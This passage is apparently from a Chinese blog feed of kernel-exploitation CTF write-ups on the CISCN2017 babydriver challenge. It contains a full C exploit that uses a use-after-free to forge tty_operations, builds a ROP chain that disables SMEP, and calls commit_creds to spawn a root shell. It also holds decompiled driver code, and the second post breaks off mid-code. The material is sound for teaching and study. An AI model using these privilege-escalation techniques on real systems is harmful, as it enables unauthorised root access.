__randomize_layout;</span><br></pre></td></tr></table></figure><p>在这个结构体的有另一个结构体<code>const struct tty_operations *ops;</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">                struct serial_icounter_struct *icount);</span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> (*proc_show)(struct seq_file *, <span class="keyword">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>可以看到这里面存在许多的函数地址指针，有之前堆的基础的就可以想到这是类似与控制vtable然后伪造函数指针来劫持程序执行流。</p><p>不过不同的是，我们在堆中使用的是one_gadget，但是这里我们是把获得root的payload放在栈上，但是内核态的sp并不指向我们存放的payload的地址，所以动态调试看一下如何解决。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> fake_tty_operations[<span class="number">30</span>] = &#123;</span><br><span class="line">    <span class="number">0xffffffff810d238d</span>, <span class="comment">// pop rdi; ret;</span></span><br><span class="line">    <span class="number">0xffffffff810d238d</span>,</span><br><span class="line">    <span class="number">0xffffffff810d238d</span>,</span><br><span class="line">    <span class="number">0xffffffff810d238d</span>,</span><br><span class="line">    <span class="number">0xffffffff810d238d</span>,</span><br><span class="line">    <span class="number">0xffffffff810d238d</span>,</span><br><span class="line">    <span class="number">0xffffffff810d238d</span>,</span><br><span class="line">    <span class="number">0xffffffff810d238d</span>,</span><br><span class="line">    <span class="number">0xffffffff810d238d</span>,</span><br><span class="line">    <span class="number">0xffffffff810d238d</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line"><span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0x2e0</span>); <span class="comment">// 0x2e0是tty_struct结构体的size</span></span><br><span class="line">close(fd1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd_tty = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line"><span class="keyword">size_t</span> fake_tty_struct[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">read(fd2, fake_tty_struct, <span class="number">32</span>);</span><br><span class="line">fake_tty_struct[<span class="number">3</span>] = (<span class="keyword">size_t</span>)fake_tty_operations;</span><br><span class="line">write(fd2, fake_tty_struct, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">write(fd_tty, buf, <span class="number">8</span>);</span><br></pre></td></tr></table></figure><p><img src="/images/kernel-pwn%E5%9F%BA%E7%A1%80-1/image-20220322151522944.png" alt="image-20220322151522944"></p><p><img src="/images/kernel-pwn%E5%9F%BA%E7%A1%80-1/image-20220322151539105.png" alt="image-20220322151539105"></p><p>可以看到在执行到我们构造的加指针位置时的rax是指向我们构造的fake_tty_operations结构体。</p><p>然后就是寻在gadget，不过实现rsp的转移，这里找gadget不能直接在ropper出来的内容里找，因为这不是常规的gadget所以里面不存在</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcdy@arch-linux ~/Downloads/study_kernel % objdump -d vmlinux &gt; gadget2.txt</span><br></pre></td></tr></table></figure><p><img src="/images/kernel-pwn%E5%9F%BA%E7%A1%80-1/image-20220322154958568.png" alt="image-20220322154958568"></p><p><img src="/images/kernel-pwn%E5%9F%BA%E7%A1%80-1/image-20220322155018274.png" alt="image-20220322155018274"></p><p>这是两句拼接在一起的gadget，不过依旧可以正常使用。接着就是做ret2usr即可</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prepare_kernel_cred_addr 0xffffffff810a1810</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> commit_creds_addr 0xffffffff810a1420</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] root now!&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *(*pkc)(<span class="keyword">int</span>) = prepare_kernel_cred_addr;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span> *) = commit_creds_addr;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">size_t</span> payload[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    payload[i++] = <span class="number">0xffffffff810d238d</span>; <span class="comment">// pop rdi; ret;</span></span><br><span class="line">    payload[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">    payload[i++] = <span class="number">0xffffffff81004d80</span>; <span class="comment">// mov cr4, rdi; pop rbp; ret;</span></span><br><span class="line">    payload[i++] = <span class="number">0</span>;</span><br><span class="line">    payload[i++] = (<span class="keyword">size_t</span>)get_root;</span><br><span class="line">    payload[i++] = <span class="number">0xffffffff81063694</span>; <span class="comment">// swapgs; pop rbp; ret;</span></span><br><span class="line">    payload[i++] = <span class="number">0</span>;</span><br><span class="line">    payload[i++] = <span class="number">0xffffffff814e35ef</span>; <span class="comment">// iretq; ret;</span></span><br><span class="line">    payload[i++] = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">    payload[i++] = user_cs;</span><br><span class="line">    payload[i++] = user_rflags;</span><br><span class="line">    payload[i++] = user_sp;</span><br><span class="line">    payload[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pop_rax = <span class="number">0xffffffff8100ce6e</span>;</span><br><span class="line">    <span class="keyword">size_t</span> mov_rsp_rax = <span class="number">0xffffffff8181bfc5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_operations[<span class="number">30</span>] = &#123;</span><br><span class="line">        pop_rax,</span><br><span class="line">        (<span class="keyword">size_t</span>)payload,</span><br><span class="line">        mov_rsp_rax,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mov_rsp_rax, <span class="comment">// write point</span></span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0x2e0</span>); <span class="comment">// 0x2e0是tty_struct结构体的size</span></span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd_tty = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_struct[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd2, fake_tty_struct, <span class="number">32</span>);</span><br><span class="line">    fake_tty_struct[<span class="number">3</span>] = (<span class="keyword">size_t</span>)fake_tty_operations;</span><br><span class="line">    write(fd2, fake_tty_struct, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    write(fd_tty, buf, <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里的例题仍然是上一篇的两个例题，不过使用不同的解法。&lt;/p&gt;
&lt;h2 id=&quot;2018-强网杯-core&quot;&gt;&lt;a href=&quot;#2018-强网杯-core&quot; class=&quot;headerlink&quot; title=&quot;2018 强网杯 - core&quot;&gt;&lt;/a&gt;2018 强网杯 -</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="ret2usr" scheme="https://cv196082.gitee.io/tags/ret2usr/"/>
    
    <category term="bypass semp" scheme="https://cv196082.gitee.io/tags/bypass-semp/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn基础</title>
    <link href="https://cv196082.gitee.io/2022/03/21/kernel-pwn%E5%9F%BA%E7%A1%80/"/>
    <id>https://cv196082.gitee.io/2022/03/21/kernel-pwn%E5%9F%BA%E7%A1%80/</id>
    <published>2022-03-21T14:20:33.000Z</published>
    <updated>2022-03-22T04:34:05.764Z</updated>
    
    <content type="html"><![CDATA[<p>在学习kernel pwn我就是完全跟着wiki走的</p><h2 id="CISCN2017-babydriver"><a href="#CISCN2017-babydriver" class="headerlink" title="CISCN2017 - babydriver"></a>CISCN2017 - babydriver</h2><h3 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h3><p>首先题目一般是会给我们三个文件，bzImage，boot.sh，rootfs.cpio</p><p>boot.sh：启动kernel的shell脚本</p><p>bzImage：kernel binary</p><p>rootfs.cpio：文件系统</p><p>这里要看文件系统的话需要先改变尾缀为gz，然后gunzip rootfs.cpio.gz，最后再cpio -idmv &lt; rootfs.cpio</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/download/study_kernel/core ls                                                 </span><br><span class="line">bin  etc  home  init  lib  linuxrc  proc  rootfs.cpio  sbin  sys  tmp  usr</span><br></pre></td></tr></table></figure><p>接下来查看init文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">~/download/study_kernel/core cat ./init -n                                     </span><br><span class="line">     1<span class="comment">#!/bin/sh</span></span><br><span class="line">     2 </span><br><span class="line">     3mount -t proc none /proc</span><br><span class="line">     4mount -t sysfs none /sys</span><br><span class="line">     5mount -t devtmpfs devtmpfs /dev</span><br><span class="line">     6chown root:root flag</span><br><span class="line">     7chmod 400 flag</span><br><span class="line">     8<span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line">     9<span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line">    10<span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line">    11</span><br><span class="line">    12insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">    13chmod 777 /dev/babydev</span><br><span class="line">    14<span class="built_in">echo</span> -e <span class="string">&quot;\nBoot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span></span><br><span class="line">    15setsid cttyhack setuidgid 1000 sh</span><br><span class="line">    16</span><br><span class="line">    17umount /proc</span><br><span class="line">    18umount /sys</span><br><span class="line">    19poweroff -d 0  -f</span><br><span class="line">    20</span><br></pre></td></tr></table></figure><p>可以看到在12行的时候加入一个驱动文件，一般这就是漏洞LKM。拿到驱动文件开始分析</p><h3 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h3><p><img src="/images/kernel-pwn%E5%9F%BA%E7%A1%80/image-20220316171315785.png" alt="image-20220316171315785"></p><p>首先可以看到除了堆栈不可执行其余保护都是没开的</p><p><img src="/images/kernel-pwn%E5%9F%BA%E7%A1%80/image-20220316171214341.png" alt="image-20220316171214341"></p><p>首先在ida可以看到这一结构体</p><p>再看babyioctl函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">babyioctl</span><span class="params">(file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> command, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, command, arg);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = _kmalloc(v4, <span class="number">0x24000C0</span>LL);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>, <span class="number">0x24000C0</span>LL);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB, v3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这里在command为0x10001时，会先free掉以前的chunk，随后malloc一个我们给他的size的chunk。</p><p>babyopen:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">babyopen</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">0x40</span>LL);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>, <span class="number">0x24000C0</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就会生成一个size为0x40的chunk</p><p>babyrelease:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>, filp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会释放掉结构体所储存的chunk指针。</p><p>babyread:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">babyread</span><span class="params">(file *filp, <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_to_user(buffer);</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是如果我们传入的size小于储存的size即可实行copy_to_user。</p><p>babywrite:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">babywrite</span><span class="params">(file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span 